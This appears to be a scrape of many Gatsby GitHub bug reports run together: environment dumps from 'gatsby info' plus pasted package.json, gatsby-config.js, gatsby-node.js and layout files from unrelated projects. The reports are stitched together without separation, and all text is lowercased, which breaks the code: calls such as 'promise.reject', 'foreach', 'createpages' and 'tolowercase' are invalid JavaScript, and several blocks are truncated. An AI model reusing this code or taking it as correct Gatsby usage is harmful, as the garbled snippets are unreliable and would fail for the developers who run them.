{ "name": "<name>", "version": "1.0.0", "license": "mit", "private": true, "dependencies": { "bulma": "^0.7.1", "emotion": "^9.2.6", "emotion-server": "^9.2.6", "gatsby": "^2.0.0-beta.61", "gatsby-image": "^2.0.0-beta.7", "gatsby-plugin-emotion": "^2.0.0-beta.3", "gatsby-plugin-google-analytics": "^2.0.0-beta.3", "gatsby-plugin-manifest": "^2.0.2-beta.3", "gatsby-plugin-netlify": "^2.0.0-beta.4", "gatsby-plugin-offline": "^2.0.0-beta.5", "gatsby-plugin-react-helmet": "^2.0.11", "gatsby-plugin-robots-txt": "^1.2.0", "gatsby-plugin-sass": "^2.0.0-beta.6", "gatsby-plugin-sharp": "^2.0.0-beta.7", "gatsby-plugin-sitemap": "^2.0.0-beta.3", "gatsby-remark-copy-linked-files": "^2.0.0-beta.3", "gatsby-remark-images": "^2.0.1-beta.9", "gatsby-source-filesystem": "^2.0.1-beta.10", "gatsby-transformer-remark": "^2.1.1-beta.5", "gatsby-transformer-sharp": "^2.1.1-beta.6", "node-sass": "^4.9.2", "react": "^16.4.1", "react-dom": "^16.4.1", "react-emotion": "^9.2.6", "react-helmet": "^5.2.0", "rehype-react": "^3.0.3" }, "devdependencies": { "eslint": "^5.2.0", "eslint-config-airbnb": "^17.0.0", "eslint-plugin-import": "^2.13.0", "eslint-plugin-jsx-a11y": "^6.1.1", "eslint-plugin-react": "^7.10.0", "prettier": "^1.14.0", "prettier-eslint": "^8.8.2" }, "scripts": { "dev": "gatsby develop", "build": "gatsby build" }
``` `gatsby-node.js`: ```
/** * implement gatsby's node apis in this file
* * see: */ const path = require('path'); exports.createpages = ({ actions, graphql }) => { const { createpage } = actions; const blogposttemplate = path.resolve('src/templates/blogposttemplate.js'); return graphql(` { allmarkdownremark(sort: { order: desc, fields: [frontmatter___date] }, limit: 1000) { edges { node { frontmatter { path } } } } } `).then((result) => { if (result.errors) { return promise.reject(result.errors); } return result.data.allmarkdownremark.edges.foreach(({ node }) => { createpage({ path: node.frontmatter.path, component: blogposttemplate, context: {} // additional data can be passed via context }); }); });
``` `gatsby-browser.js`: n/a
`gatsby-ssr.js`: n/a
``` system: os: macos high sierra 10.13.6 cpu: x64 intel(r) core(tm) i5-7267u cpu @ 3.10ghz shell: 5.3 - /bin/zsh binaries: node: 10.1.0 - ~/.nvm/versions/node/v10.1.0/bin/node yarn: 1.6.0 - /usr/local/bin/yarn npm: 6.0.1 - ~/.nvm/versions/node/v10.1.0/bin/npm browsers: chrome: 68.0.3440.75 safari: 11.1.2 npmpackages: gatsby: next => 2.0.0-beta.61 gatsby-plugin-react-helmet: next => 3.0.0-beta.4 npmglobalpackages: gatsby-cli: 1.1.58
``` ### file contents (if changed) `gatsby-config.js`: n/a
`package.json`: n/a
`gatsby-node.js`: n/a
`gatsby-browser.js`: n/a
`gatsby-ssr.js`: n/a
``` system: os: linux 4.15 ubuntu 18.04.1 lts (bionic beaver) cpu: x64 intel(r) core(tm) i7-4600u cpu @ 2.10ghz shell: 4.4.19 - /bin/bash binaries: node: 10.7.0 - /usr/bin/node npm: 6.2.0 - ~/.npm-global/bin/npm browsers: firefox: 61.0.1 npmpackages: gatsby: next => 2.0.0-beta.61 gatsby-plugin-manifest: next => 2.0.2-beta.3 gatsby-plugin-offline: next => 2.0.0-beta.5 gatsby-plugin-react-helmet: next => 3.0.0-beta.4 gatsby-source-filesystem: next => 2.0.1-beta.10 gatsby-transformer-json: next => 2.1.1-beta.4 npmglobalpackages: gatsby-cli: 1.1.58 gatsby-starter-default: 1.0.0
``` ### file contents (if changed) `gatsby-config.js`: ```
module.exports = { sitemetadata: { title: \'jarrods rss reader\', }, plugins: [ \'gatsby-plugin-react-helmet\', `gatsby-transformer-json`, { resolve: `gatsby-source-filesystem`, options: { path: `./data/`, }, }, { resolve: `gatsby-plugin-manifest`, options: { name: "gatsbyjs", short_name: "gatsbyjs", start_url: "/", background_color: "#f7f0eb", theme_color: "#a2466c", display: "minimal-ui", icon: "src/images/icon.png", // this path is relative to the root of the site
}, }, `gatsby-plugin-offline` ],
`package.json`: ```
{ "name": "gatsby-starter-default", "description": "gatsby default starter", "version": "1.0.0", "author": "kyle mathews <mathews.kyle@gmail.com>", "dependencies": { "gatsby": "next", "gatsby-plugin-manifest": "next", "gatsby-plugin-offline": "next", "gatsby-plugin-react-helmet": "next", "gatsby-source-filesystem": "next", "gatsby-transformer-json": "next", "react": "^16.4.1", "react-dom": "^16.4.1", "react-helmet": "^5.2.0" }, "keywords": [ "gatsby" ], "license": "mit", "scripts": { "build": "gatsby build", "develop": "gatsby develop", "format": "prettier --write \'src/**/*.js\'", "test": "echo \\"error: no test specified\\" && exit 1" }, "devdependencies": { "prettier": "^1.12.0" }, "repository": { "type": "git", "url": " " }
`gatsby-node.js`:
const path = require(`path`)
const { createfilepath } = require(`gatsby-source-filesystem`) exports.oncreatenode = ({ node, getnode, actions}) => { const { createnodefield } = actions if (node.internal.type === 'feedsjson') { const slug = node.title.tolowercase().replace(/ /g, '-') createnodefield({ node, name: `slug`, value: slug, }) }
} exports.createpages = ({ graphql, actions }) => { const { createpage } = actions return new promise((resolve, reject) => { graphql(` { allfeedsjson { edges { node { title fields { slug } } } } } `).then(result => { result.data.allfeedsjson.edges.foreach(({ node }) => { createpage({ path: node.fields.slug, component: path.resolve(`./src/templates/feed.js`), context: { title: node.title }, }) }) resolve() }) })
`gatsby-browser.js`: n/a
`gatsby-ssr.js`: n/a
``` system: os: os x el capitan 10.11.5 cpu: x64 intel(r) core(tm) i5-5257u cpu @ 2.70ghz shell: 5.0.8 - /bin/zsh binaries: node: 8.11.3 - ~/.nvm/versions/node/v8.11.3/bin/node yarn: 1.3.2 - /usr/local/bin/yarn npm: 6.1.0 - ~/.nvm/versions/node/v8.11.3/bin/npm browsers: chrome: 67.0.3396.99 safari: 9.1.1 npmpackages: gatsby-plugin-typography: ^1.7.19 => 1.7.19 npmglobalpackages: gatsby-cli: 1.1.58
<!-- required
run `gatsby info --clipboard` in your gatsby project directory and paste its contents here
not working? you may need to update your global gatsby-cli - `npm install -g gatsby-cli`
--> ### file contents (if changed) `gatsby-config.js`: ```js
module.exports = { plugins: [`gatsby-plugin-typography`],
`package.json`: ```js
{ "name": "gatsby-starter-hello-world", "description": "gatsby hello world starter", "license": "mit", "scripts": { "develop": "gatsby develop", "build": "gatsby build", "serve": "gatsby serve" }, "dependencies": { "gatsby": "next", "gatsby-plugin-typography": "^1.7.19", "react": "^16.3.2", "react-dom": "^16.3.2", "react-typography": "^0.16.13", "typography": "^0.16.17" }
`gatsby-node.js`: n/a
`gatsby-browser.js`: n/a
`gatsby-ssr.js`: n/a
macos: el capitan 10.11.6
node: v8.9.4
package.json
``` <!-- required
run `gatsby info --clipboard` in your gatsby project directory and paste its contents here
not working? you may need to update your global gatsby-cli - `npm install -g gatsby-cli`
--> ### file contents (if changed) `gatsby-config.js`: ```
module.exports = { plugins: [ `gatsby-plugin-stylus` ],
``` `package.json`: n/a
{ "name": "gatsby-starter-hello-world", "description": "gatsby hello world starter", "license": "mit", "scripts": { "develop": "gatsby develop", "build": "gatsby build", "serve": "gatsby serve" }, "dependencies": { "gatsby": "^1.9.250", "gatsby-plugin-stylus": "^1.1.21", "stylus": "^0.54.5" }
(if relevant)
gatsby 1.1.52
``` system: os: macos high sierra 10.13.6 cpu: x64 intel(r) core(tm) i5-5257u cpu @ 2.70ghz shell: 3.2.57 - /bin/bash binaries: node: 6.14.3 - ~/.nvm/versions/node/v6.14.3/bin/node yarn: 1.7.0 - /usr/local/bin/yarn npm: 3.10.10 - ~/.nvm/versions/node/v6.14.3/bin/npm browsers: chrome: 67.0.3396.99 firefox: 61.0.1 safari: 11.1.2 npmpackages: gatsby: ^1.9.250 => 1.9.277 gatsby-link: ^1.6.40 => 1.6.46 npmglobalpackages: gatsby-cli: 1.1.58
``` system: os: macos sierra 10.12.6 cpu: x64 intel(r) core(tm) i7-7820hq cpu @ 2.90ghz shell: 5.2 - /bin/zsh binaries: node: 8.11.3 - /usr/local/bin/node npm: 5.6.0 - /usr/local/bin/npm browsers: chrome: 67.0.3396.99 firefox: 60.0.2 safari: 11.1.1 npmpackages: gatsby: ^1.9.273 => 1.9.273 gatsby-link: ^1.6.45 => 1.6.45 gatsby-plugin-nprogress: ^1.0.14 => 1.0.14 gatsby-plugin-preact: ^1.0.17 => 1.0.17 gatsby-plugin-react-helmet: ^2.0.11 => 2.0.11 gatsby-plugin-sharp: ^1.6.48 => 1.6.48 gatsby-plugin-stylus: ^1.1.21 => 1.1.21 gatsby-plugin-typography: ^1.7.19 => 1.7.19 gatsby-remark-autolink-headers: ^1.4.19 => 1.4.19 gatsby-remark-copy-linked-files: ^1.5.37 => 1.5.37 gatsby-remark-images: ^1.5.67 => 1.5.67 gatsby-remark-prismjs: ^2.0.4 => 2.0.4 gatsby-transformer-remark: ^1.7.44 => 1.7.44 npmglobalpackages: gatsby-cli: 1.1.58
``` ### file contents (if changed) ```js
module.exports = { ..
plugins: [ ..
{ resolve: 'gatsby-plugin-typography', options: { pathtoconfigmodule: 'path/to/typography.js', }, }, ],
<!-- required
run `gatsby info --clipboard` in your gatsby project directory and paste its contents here
not working? you may need to update your global gatsby-cli - `npm install -g gatsby-cli`
--> system: os: macos high sierra 10.13.6 cpu: x64 intel(r) core(tm) i5-7360u cpu @ 2.30ghz shell: 5.3 - /bin/zsh binaries: node: 8.11.3 - ~/.nvm/versions/node/v8.11.3/bin/node npm: 6.1.0 - ~/.nvm/versions/node/v8.11.3/bin/npm browsers: chrome: 67.0.3396.99 safari: 11.1.2 npmpackages: gatsby: next => 2.0.0-beta.46 gatsby-image: next => 2.0.0-beta.6 gatsby-plugin-react-helmet: next => 3.0.0-beta.3 gatsby-plugin-sass: next => 2.0.0-beta.5 gatsby-plugin-sharp: next => 2.0.0-beta.5 gatsby-source-filesystem: next => 2.0.1-beta.6 gatsby-transformer-remark: next => 2.1.1-beta.3 npmglobalpackages: gatsby: 2.0.0-beta.46 ### file contents (if changed) `gatsby-config.js`: ```javascript module.exports = { sitemetadata: { title: 'gatsby default starter', }, plugins: [ `gatsby-plugin-react-helmet`, { resolve: `gatsby-source-filesystem`, options: { path: `${__dirname}/src/posts`, name: `posts`, }, }, `gatsby-transformer-remark`, `gatsby-plugin-sass` ],
``` `package.json`: ```json
{ "name": "carusog", "description": "giuseppe caruso personal blog", "version": "1.0.0", "author": "giuseppe caruso <myemail@example.com>", "dependencies": { "gatsby": "next", "gatsby-image": "next", "gatsby-plugin-react-helmet": "next", "gatsby-plugin-sass": "next", "gatsby-plugin-sharp": "next", "gatsby-source-filesystem": "next", "gatsby-transformer-remark": "next", "node-sass": "^4.9.2", "react": "^16.4.1", "react-dom": "^16.4.1", "react-helmet": "^5.2.0" }, "keywords": [ "gatsby" ], "license": "mit", "scripts": { "build": "gatsby build", "develop": "gatsby develop", "format": "prettier --write \'src/**/*.js\'", "test": "echo \\"error: no test specified\\" && exit 1" }, "devdependencies": { "prettier": "^1.12.0" }
``` `gatsby-node.js`:
```javascript /** * implement gatsby's node apis in this file
* * see: */ const path = require('path') exports.createpages = ({ actions, graphql }) => { const { createpage } = actions const blogposttemplate = path.resolve(`src/templates/blog-post.js`) return graphql(` { allmarkdownremark( sort: { order: desc, fields: [frontmatter___date] }, limit: 10 ) { edges { node { html id frontmatter { title date path excerpt tags } } } } } `) .then(result => { if (result.errors) { return promise.reject(result.errors) } const posts = result.data.allmarkdownremark.edges posts.foreach(({ node }, index) => { createpage({ path: node.frontmatter.path, component: blogposttemplate, context: { // prev and next seem inverted but we must consider that being posts sorted // by date, desc, last one is actually first post and vice versa next: index === 0 ? null : posts[index - 1].node, prev: index === (posts.length - 1) ? null : posts[index + 1].node } }) }); })
``` `gatsby-browser.js`: n/a
`gatsby-ssr.js`: n/a
``` system: os: macos high sierra 10.13.4 cpu: x64 intel(r) core(tm) i5-7360u cpu @ 2.30ghz shell: 3.2.57 - /bin/bash binaries: node: 10.6.0 - /usr/local/bin/node yarn: 1.7.0 - /usr/local/bin/yarn npm: 6.1.0 - /usr/local/bin/npm browsers: chrome: 67.0.3396.99 firefox: 61.0.1 safari: 11.1 npmpackages: gatsby: 2.0.0-beta.29 => 2.0.0-beta.29 gatsby-plugin-react-helmet: next => 3.0.0-beta.3 gatsby-source-contentful: next => 2.0.1-beta.13 gatsby-transformer-remark: next => 2.1.1-beta.3
``` ### file contents (if changed) `gatsby-config.js`: n/a
`package.json`: n/a
`gatsby-node.js`: n/a
`gatsby-browser.js`: n/a
`gatsby-ssr.js`: n/a
system: os: macos high sierra 10.13.5 cpu: x64 intel(r) core(tm) i5-5250u cpu @ 1.60ghz shell: 3.2.57 - /bin/bash binaries: node: 10.6.0 - /usr/local/bin/node yarn: 1.7.0 - /usr/local/bin/yarn npm: 6.1.0 - /usr/local/bin/npm browsers: chrome: 67.0.3396.99 firefox: 61.0 safari: 11.1.1 npmpackages: gatsby: next => 2.0.0-beta.40 gatsby-plugin-react-helmet: next => 3.0.0-beta.3
``` system: os: macos high sierra 10.13.5 cpu: x64 intel(r) core(tm) i7-6567u cpu @ 3.30ghz shell: 5.5.1 - /usr/local/bin/zsh binaries: node: 10.6.0 - /usr/local/cellar/node/10.6.0/bin/node yarn: 1.7.0 - /usr/local/bin/yarn npm: 6.1.0 - /usr/local/bin/npm browsers: chrome: 67.0.3396.99 firefox: 60.0.2 safari: 11.1.1 npmpackages: gatsby: 2.0.0-beta.20 => 2.0.0-beta.20 gatsby-plugin-react-helmet: next => 3.0.0-beta.2 gatsby-source-filesystem: next => 2.0.1-beta.5 gatsby-transformer-remark: next => 2.1.1-beta.3
``` ### file contents (if changed)
system: os: macos sierra 10.12.6 cpu: x64 intel(r) core(tm) i7-4980hq cpu @ 2.80ghz shell: 3.2.57 - /bin/bash binaries: node: 9.11.2 - ~/.nvm/versions/node/v9.11.2/bin/node yarn: 1.5.1 - /usr/local/bin/yarn npm: 5.6.0 - ~/.nvm/versions/node/v9.11.2/bin/npm browsers: chrome: 67.0.3396.99 firefox: 61.0 safari: 11.1.1 npmpackages: gatsby: 1.9.273 => 1.9.273 gatsby-link: ^1.6.40 => 1.6.45 gatsby-node-helpers: ^0.3.0 => 0.3.0 gatsby-plugin-react-helmet: ^2.0.10 => 2.0.11 gatsby-remark-autolink-headers: ^1.4.19 => 1.4.19 gatsby-remark-images: ^1.5.67 => 1.5.67 gatsby-remark-prismjs: ^2.0.4 => 2.0.4 gatsby-source-filesystem: ^1.5.39 => 1.5.39 gatsby-transformer-remark: ^1.7.44 => 1.7.44 gatsby-transformer-yaml: ^1.5.18 => 1.5.18 npmglobalpackages: gatsby-cli: 1.1.58 ### file contents (if changed) `gatsby-config.js`: n/a
`package.json`:
`gatsby-node.js` (simplified): ```javascript
exports.sourcenodes = ({ boundactioncreators }, options = {}) => { const { createnode } = boundactioncreators const pages = [] const node = { id: 'docs_menu', children: [], parent: 'menu', internal: { type: 'menu', contentdigest: json.stringify(pages) }, pages } createnode(node)
`gatsby-browser.js`: n/a
`gatsby-ssr.js`: n/a
system: os: os x el capitan 10.11.6 cpu: x64 intel(r) core(tm) i7-4770hq cpu @ 2.20ghz shell: 3.2.57 - /bin/bash binaries: node: 9.5.0 - /usr/local/bin/node yarn: 1.3.2 - ~/.yarn/bin/yarn npm: 5.6.0 - /usr/local/bin/npm browsers: chrome: 67.0.3396.99 firefox: 59.0.2 safari: 11.1.2 npmpackages: gatsby: ^2.0.0-beta.29 => 2.0.0-beta.34 gatsby-image: ^2.0.0-beta.6 => 2.0.0-beta.6 gatsby-link: ^2.0.0-beta.4 => 2.0.0-beta.4 gatsby-plugin-babel: ^1.0.0 => 1.0.0 gatsby-plugin-catch-links: ^2.0.2-beta.2 => 2.0.2-beta.2 gatsby-plugin-google-analytics: ^2.0.0-beta.2 => 2.0.0-beta.2 gatsby-plugin-manifest: ^2.0.2-beta.2 => 2.0.2-beta.2 gatsby-plugin-offline: ^2.0.0-beta.3 => 2.0.0-beta.3 gatsby-plugin-react-helmet: v2 => 2.0.11 gatsby-plugin-sass: ^2.0.0-beta.5 => 2.0.0-beta.5 gatsby-plugin-sharp: ^2.0.0-beta.3 => 2.0.0-beta.5 gatsby-plugin-sitemap: ^2.0.0-beta.2 => 2.0.0-beta.2 gatsby-remark-images: ^2.0.1-beta.4 => 2.0.1-beta.6 gatsby-source-filesystem: ^2.0.1-beta.3 => 2.0.1-beta.3 gatsby-transformer-remark: ^2.1.1-beta.3 => 2.1.1-beta.3 gatsby-transformer-sharp: ^2.1.1-beta.3 => 2.1.1-beta.3 npmglobalpackages: gatsby-cli: 1.1.58
system: os: macos sierra 10.12.6 cpu: x64 intel(r) core(tm) i5-5287u cpu @ 2.90ghz shell: 5.2 - /bin/zsh binaries: node: 9.7.1 - ~/.nvm/versions/node/v9.7.1/bin/node yarn: 1.5.1 - /usr/local/bin/yarn npm: 6.0.0 - ~/.nvm/versions/node/v9.7.1/bin/npm browsers: chrome: 67.0.3396.99 firefox: 57.0.4 safari: 11.0.1 npmpackages: gatsby: 2.0.0-beta.29 => 2.0.0-beta.29 gatsby-cli: 2.0.0-beta.5 => 2.0.0-beta.5 gatsby-plugin-react-helmet: next => 3.0.0-beta.3 npmglobalpackages: gatsby-cli: 1.1.44 ### file contents (if changed) `gatsby-config.js`: n/a
`package.json`: n/a
`gatsby-node.js`: n/a
`gatsby-browser.js`: n/a
`gatsby-ssr.js`: n/a
system: os: macos high sierra 10.13.6 cpu: x64 intel(r) core(tm) i5-3470 cpu @ 3.20ghz shell: 5.3 - /bin/zsh binaries: node: 10.2.1 - ~/.nvm/versions/node/v10.2.1/bin/node yarn: 1.7.0 - /usr/local/bin/yarn npm: 5.6.0 - ~/.nvm/versions/node/v10.2.1/bin/npm browsers: chrome: 67.0.3396.99 safari: 11.1.2 npmpackages: gatsby: ^2.0.0-beta.37 => 2.0.0-beta.37 gatsby-plugin-catch-links: next => 2.0.2-beta.2 gatsby-plugin-favicon: 2.1.1 => 2.1.1 gatsby-plugin-google-analytics: next => 2.0.0-beta.2 gatsby-plugin-manifest: next => 2.0.2-beta.2 gatsby-plugin-offline: next => 2.0.0-beta.3 gatsby-plugin-react-helmet: next => 3.0.0-beta.3 gatsby-plugin-styled-components: next => 3.0.0-beta.2 gatsby-plugin-typography: next => 2.2.0-beta.2 gatsby-remark-images-contentful: next => 2.0.0-beta.2 gatsby-remark-smartypants: next => 2.0.0-beta.2 gatsby-source-contentful: next => 2.0.1-beta.13 gatsby-transformer-remark: next => 2.1.1-beta.3 npmglobalpackages: gatsby-cli: 2.0.0-beta.6 ### file contents this is what `/src/components/layout.js` looks like ```
import react, { fragment } from 'react'
import { staticquery, graphql } from 'gatsby'
import styled, { themeprovider, injectglobal } from 'styled-components' import header from './header'
import footer from './footer'
import theme from '../utils/theme'
import background from '../assets/background.jpg' injectglobal` body { background: url(${background}) no-repeat center center fixed; background-size: cover; color: ${props => props.theme.mainwhite}; } #___gatsby { height: 100vh; display: grid; grid-template-rows: auto 1fr auto; background: rgba(0, 0, 0, 0.3); }
` const content = styled.main` display: grid; grid-template-rows: auto 1fr;
` const render = (children) => ({ header, footer, site }) => ( <themeprovider theme={theme}> <fragment> <header meta={site.meta} header={header.data} /> <content>{children}</content> <footer footer={footer.data} /> </fragment> </themeprovider>
) export const sitemetaquery = graphql` fragment sitemetaquery on rootquerytype { site { meta: sitemetadata { title url: siteurl } } }
` const query = graphql` { ...sitemetaquery header: contentfuljson(title: {eq: "header"}) { data { external { googlescholar } nav { url title } } } footer: contentfuljson(title: {eq: "footer"}) { data { copyright links { url title } author } } }
` const layout = ({ children }) => ( <staticquery query={query} render={render(children)} />
) export default layout
``` system: os: os x el capitan 10.11.6 cpu: x64 intel(r) core(tm) i7-4770hq cpu @ 2.20ghz shell: 3.2.57 - /bin/bash binaries: node: 9.5.0 - /usr/local/bin/node yarn: 1.3.2 - ~/.yarn/bin/yarn npm: 5.6.0 - /usr/local/bin/npm browsers: chrome: 67.0.3396.99 firefox: 59.0.2 safari: 11.1.2 npmpackages: gatsby: ^2.0.0-beta.29 => 2.0.0-beta.34 gatsby-image: ^2.0.0-beta.6 => 2.0.0-beta.6 gatsby-link: ^2.0.0-beta.4 => 2.0.0-beta.4 gatsby-plugin-catch-links: ^2.0.2-beta.2 => 2.0.2-beta.2 gatsby-plugin-google-analytics: ^2.0.0-beta.2 => 2.0.0-beta.2 gatsby-plugin-manifest: ^2.0.2-beta.2 => 2.0.2-beta.2 gatsby-plugin-offline: ^2.0.0-beta.3 => 2.0.0-beta.3 gatsby-plugin-react-helmet: v2 => 2.0.11 gatsby-plugin-sass: ^2.0.0-beta.5 => 2.0.0-beta.5 gatsby-plugin-sharp: ^2.0.0-beta.3 => 2.0.0-beta.5 gatsby-plugin-sitemap: ^2.0.0-beta.2 => 2.0.0-beta.2 gatsby-remark-images: ^2.0.1-beta.4 => 2.0.1-beta.6 gatsby-source-filesystem: ^2.0.1-beta.3 => 2.0.1-beta.3 gatsby-transformer-remark: ^2.1.1-beta.3 => 2.1.1-beta.3 gatsby-transformer-sharp: ^2.1.1-beta.3 => 2.1.1-beta.3 npmglobalpackages: gatsby-cli: 1.1.58
### file contents gatsby-config.js: ```{ "name": "custom-site", "version": "2.0.0", "main": "index.js", "license": "mit", "dependencies": { "classnames": "^2.2.6", "gatsby": "^2.0.0-beta.29", "gatsby-image": "^2.0.0-beta.6", "gatsby-link": "^2.0.0-beta.4", "gatsby-plugin-catch-links": "^2.0.2-beta.2", "gatsby-plugin-google-analytics": "^2.0.0-beta.2", "gatsby-plugin-manifest": "^2.0.2-beta.2", "gatsby-plugin-offline": "^2.0.0-beta.3", "gatsby-plugin-react-helmet": "v2", "gatsby-plugin-sass": "^2.0.0-beta.5", "gatsby-plugin-sharp": "^2.0.0-beta.3", "gatsby-plugin-sitemap": "^2.0.0-beta.2", "gatsby-remark-images": "^2.0.1-beta.4", "gatsby-source-filesystem": "^2.0.1-beta.3", "gatsby-transformer-remark": "^2.1.1-beta.3", "gatsby-transformer-sharp": "^2.1.1-beta.3", "mobx": "^5.0.3", "mobx-react": "^5.2.3", "prop-types": "^15.6.2", "react": "^16.4.1", "react-dom": "^16.4.1", "react-helmet": "^5.2.0", "react-loadable": "^5.4.0" }, "scripts": { "start": "npm run develop", "build": "gatsby build", "develop": "gatsby develop", "serve": "gatsby serve" }
package.json:
{ "name": "custom-site", "version": "2.0.0", "main": "index.js", "license": "mit", "dependencies": { "classnames": "^2.2.6", "gatsby": "^2.0.0-beta.29", "gatsby-image": "^2.0.0-beta.6", "gatsby-link": "^2.0.0-beta.4", "gatsby-plugin-catch-links": "^2.0.2-beta.2", "gatsby-plugin-google-analytics": "^2.0.0-beta.2", "gatsby-plugin-manifest": "^2.0.2-beta.2", "gatsby-plugin-offline": "^2.0.0-beta.3", "gatsby-plugin-react-helmet": "v2", "gatsby-plugin-sass": "^2.0.0-beta.5", "gatsby-plugin-sharp": "^2.0.0-beta.3", "gatsby-plugin-sitemap": "^2.0.0-beta.2", "gatsby-remark-images": "^2.0.1-beta.4", "gatsby-source-filesystem": "^2.0.1-beta.3", "gatsby-transformer-remark": "^2.1.1-beta.3", "gatsby-transformer-sharp": "^2.1.1-beta.3", "mobx": "^5.0.3", "mobx-react": "^5.2.3", "prop-types": "^15.6.2", "react": "^16.4.1", "react-dom": "^16.4.1", "react-helmet": "^5.2.0", "react-loadable": "^5.4.0" }, "scripts": { "start": "npm run develop", "build": "gatsby build", "develop": "gatsby develop", "serve": "gatsby serve" }
system: os: macos sierra 10.12.6 cpu: x64 intel(r) core(tm) i7-7820hq cpu @ 2.90ghz shell: 5.2 - /bin/zsh binaries: node: 8.11.3 - /usr/local/bin/node npm: 5.6.0 - /usr/local/bin/npm browsers: chrome: 67.0.3396.99 firefox: 60.0.2 safari: 11.1.1 npmpackages: gatsby: ^1.9.273 => 1.9.273 gatsby-link: ^1.6.45 => 1.6.45 gatsby-plugin-nprogress: ^1.0.14 => 1.0.14 gatsby-plugin-preact: ^1.0.17 => 1.0.17 gatsby-plugin-react-helmet: ^2.0.11 => 2.0.11 gatsby-plugin-sharp: ^1.6.48 => 1.6.48 gatsby-plugin-stylus: ^1.1.21 => 1.1.21 gatsby-plugin-typography: ^1.7.19 => 1.7.19 gatsby-remark-autolink-headers: ^1.4.19 => 1.4.19 gatsby-remark-copy-linked-files: ^1.5.37 => 1.5.37 gatsby-remark-images: ^1.5.67 => 1.5.67 gatsby-remark-prismjs: ^2.0.4 => 2.0.4 gatsby-transformer-remark: ^1.7.44 => 1.7.44 npmglobalpackages: gatsby-cli: 1.1.58
<!-- required
run `gatsby info --clipboard` in your gatsby project directory and paste its contents here
not working? you may need to update your global gatsby-cli - `npm install -g gatsby-cli`
--> ### file contents (if changed) `gatsby-config.js`: n/a
`package.json`: n/a
`gatsby-node.js`: n/a
`gatsby-browser.js`: n/a
`gatsby-ssr.js`: n/a
(originally ran into this in a windows environment, but made the demo on my mac)
``` system: os: macos 10.14 cpu: x64 intel(r) core(tm) i7-7920hq cpu @ 3.10ghz shell: 3.2.57 - /bin/bash binaries: node: 8.11.3 - ~/n/bin/node yarn: 1.7.0 - ~/n/bin/yarn npm: 6.1.0 - /usr/local/bin/npm browsers: chrome: 67.0.3396.99 safari: 12.0 npmpackages: gatsby: next => 2.0.0-beta.20 gatsby-plugin-feed: next => 2.0.0-beta.3 gatsby-plugin-google-analytics: next => 2.0.0-beta.2 gatsby-plugin-offline: next => 2.0.0-beta.3 gatsby-plugin-react-helmet: next => 3.0.0-beta.3 gatsby-plugin-sharp: next => 2.0.0-beta.2 gatsby-plugin-typography: next => 2.2.0-beta.2 gatsby-remark-copy-linked-files: next => 2.0.0-beta.2 gatsby-remark-custom-blocks: ^2.0.0-beta.3 => 2.0.0-beta.3 gatsby-remark-images: next => 2.0.1-beta.3 gatsby-remark-prismjs: next => 3.0.0-beta.3 gatsby-remark-responsive-iframe: next => 2.0.0-beta.2 gatsby-remark-smartypants: next => 2.0.0-beta.2 gatsby-source-filesystem: next => 2.0.1-beta.3 gatsby-transformer-remark: ^2.1.1-beta.2 => 2.1.1-beta.2 gatsby-transformer-sharp: next => 2.1.1-beta.3 ```
```text system: os: macos high sierra 10.13.5 cpu: x64 intel(r) core(tm) i7-7920hq cpu @ 3.10ghz shell: 5.3 - /bin/zsh binaries: node: 8.11.1 - ~/.nvm/versions/node/v8.11.1/bin/node yarn: 1.7.0 - /usr/local/bin/yarn npm: 6.0.0 - ~/.nvm/versions/node/v8.11.1/bin/npm browsers: chrome: 67.0.3396.99 firefox: 61.0 safari: 11.1.1 npmpackages: gatsby: ^2.0.0-beta.19 => 2.0.0-beta.19
``` system: os: macos high sierra 10.13.5 cpu: x64 intel(r) core(tm) i5-5257u cpu @ 2.70ghz shell: 5.3 - /bin/zsh binaries: node: 8.9.4 - /usr/local/bin/node npm: 6.1.0 - /usr/local/bin/npm browsers: chrome: 67.0.3396.99 firefox: 60.0.2 safari: 11.1.1 npmpackages: gatsby: ^2.0.0-beta.19 => 2.0.0-beta.19 npmglobalpackages: gatsby-cli: 1.1.58
system: os: macos high sierra 10.13.5 cpu: x64 intel(r) core(tm) i5-5287u cpu @ 2.90ghz shell: 5.3 - /bin/zsh binaries: node: 8.9.1 - ~/.nvm/versions/node/v8.9.1/bin/node yarn: 1.7.0 - /usr/local/bin/yarn npm: 6.0.1 - ~/.nvm/versions/node/v8.9.1/bin/npm browsers: chrome: 67.0.3396.99 firefox: 60.0.2 safari: 11.1.1 npmpackages: gatsby: ^1.9.273 => 1.9.273 gatsby-link: ^1.6.40 => 1.6.45 gatsby-plugin-react-helmet: ^2.0.10 => 2.0.11 npmglobalpackages: gatsby-cli: 1.1.58 ### file contents (if changed) `gatsby-config.js`: n/a
`package.json`: n/a
`gatsby-node.js`:
const path = require(`path`) const makerequest = (graphql, request) => new promise((resolve, reject) => { // query for nodes to use in creating pages
resolve( graphql(request).then(result => { if (result.errors) { reject(result.errors) } return result }) ) }) exports.createpages = ({ boundactioncreators, graphql }) => { const { createpage } = boundactioncreators const getarticles = makerequest( graphql, ` { site{ sitemetadata { title } } } ` ) .then(result => { createpage({ path: `/article/url(testing)`, component: path.resolve(`src/template/template.js`), }) }) .catch(err => console.log('error creating pages: ', err)) return promise.all([getarticles])
``` `gatsby-browser.js`: n/a
`gatsby-ssr.js`: n/a
current environment below, but tested with both yarn and npm on windows locally
i noticed the issue after a netlify deploy preview (so linux and yarn)
``` system: os: windows 10 cpu: x64 intel(r) core(tm) i7 cpu 930 @ 2.80ghz binaries: yarn: 1.7.0 - c:\\program files (x86)\\yarn\\bin\\yarn.cmd npm: 6.0.1 - c:\\program files\ odejs\ pm.cmd browsers: edge: 42.17134.1.0 npmpackages: gatsby: next => 2.0.0-beta.17 gatsby-plugin-sass: next => 2.0.0-beta.3 gatsby-plugin-typography: next => 2.2.0-beta.2
``` ### file contents (if changed) see repro repo
essentially `my-hello-world` with both plugins added.
``` system: os: macos high sierra 10.13.5 cpu: x64 intel(r) core(tm) i5-4278u cpu @ 2.60ghz shell: 5.3 - /bin/zsh binaries: node: 10.5.0 - ~/.nvm/versions/node/v10.5.0/bin/node npm: 6.1.0 - ~/.nvm/versions/node/v10.5.0/bin/npm browsers: chrome: 67.0.3396.99 firefox: 61.0 safari: 11.1.1 npmpackages: gatsby: next => 2.0.0-beta.17 gatsby-plugin-react-helmet: next => 3.0.0-beta.3 npmglobalpackages: gatsby-cli: 1.1.58
``` ### file contents (if changed) i added a css module with an image to the `gatsby-default-starter` to demonstrate the issue
you can clone into it to see if you can reproduce: the image is used in the following way: ``` background-image: url('./boa.png');
